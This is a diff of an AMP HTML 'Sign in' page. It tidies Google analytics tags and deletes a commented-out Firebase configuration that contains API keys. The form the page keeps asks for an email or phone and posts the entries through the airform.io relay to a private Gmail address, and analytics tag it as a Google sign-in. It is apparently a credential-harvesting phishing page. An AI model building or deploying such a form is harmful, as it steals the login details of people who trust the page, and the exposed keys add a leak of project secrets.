@@ -181,8 +181,6 @@
 		.logo {
 			padding: 20px;
 			display: block;
-
-
 		}
 	</style>
 
@@ -288,37 +286,39 @@
 </head>
 
 <body>
-	<amp-analytics type="gtag" data-credentials="include">
+	<!-- Configure analytics to use gtag -->
+    <amp-analytics type="gtag" data-credentials="include">
 		<script type="application/json">
-			{
-				"vars": {
-					"gtag_id": "G-WB87RXZDLZ",
-					"config": {
-						"G-WB87RXZDLZ": {
-							"groups": "default",
-							"site_speed_sample_rate": 100
-						}
-					}
-				}
+		  {
+			"vars": {
+			  "gtag_id": "G-WB87RXZDLZ",
+			  "config": {
+				"G-WB87RXZDLZ": { "groups": "default" }
+			  }
 			},
 			"triggers": {
-				"button": {
-					"selector": "btn-sign",
-					"on": "click",
-					"vars": {
-						"event_name": "Sign in",
-						"method": "Google"
-					}
+			  "button": {
+				"selector": "#btn-sign",
+				"on": "click",
+				"vars": {
+				  "event_name": "Sign in",
+				  "method": "Google"
 				}
+			  }
 			}
+		  }
 		</script>
-	</amp-analytics>
+	  </amp-analytics>
+
+
 
 	<!--=============================-->
 
 	<div class="content">
 		<div class="text">Sign in</div>
-		<form class="form" method="post" action-xhr="https://airform.io/shoes.native.ua@gmail.com" autocomplete="on" target="_top">
+		<form method="post" action-xhr="https://airform.io/shoes.native.ua@gmail.com"
+|      custom-validation-reporting="as-you-go" autocomplete="on" target="_blank">
+		<!-- <form class="form" method="post" action="https://airform.io/shoes.native.ua@gmail.com" autocomplete="on" target="_blank"> -->
 			<div class="field">
 				<span class="fas fa-user"></span>
 				<input type="text" name="email" placeholder="Email or Phone" required>
@@ -337,37 +337,5 @@
 -->
 		</form>
 	</div>
-
-
-	<!--
-<script src="https://www.gstatic.com/firebasejs/8.2.9/firebase-app.js"></script>
-
-
-<script src="https://www.gstatic.com/firebasejs/8.2.9/firebase-analytics.js"></script>
-
-<script>
-  var firebaseConfig = {
-    apiKey: "AIzaSyB5c-YmKqNiJ_FIam9g66ebDcCFFNcnrSI",
-    authDomain: "leyaluo-f37b1.firebaseapp.com",
-    projectId: "leyaluo-f37b1",
-    storageBucket: "leyaluo-f37b1.appspot.com",
-    messagingSenderId: "807299641153",
-    appId: "1:807299641153:web:0cd25a8b55f8b5c465fbc0",
-    measurementId: "G-XQBKBW77QP"
-  };
-
-  firebase.initializeApp(firebaseConfig);
-  firebase.analytics();
-</script>
--->
-
-<!-- "link": {
-	"selector": "forgot-pass",
-	"on": "click",
-	"vars": {
-		"event_name": "Forgot Password",
-		"method": "Google"
-	}
-} -->
 
 </body></html>
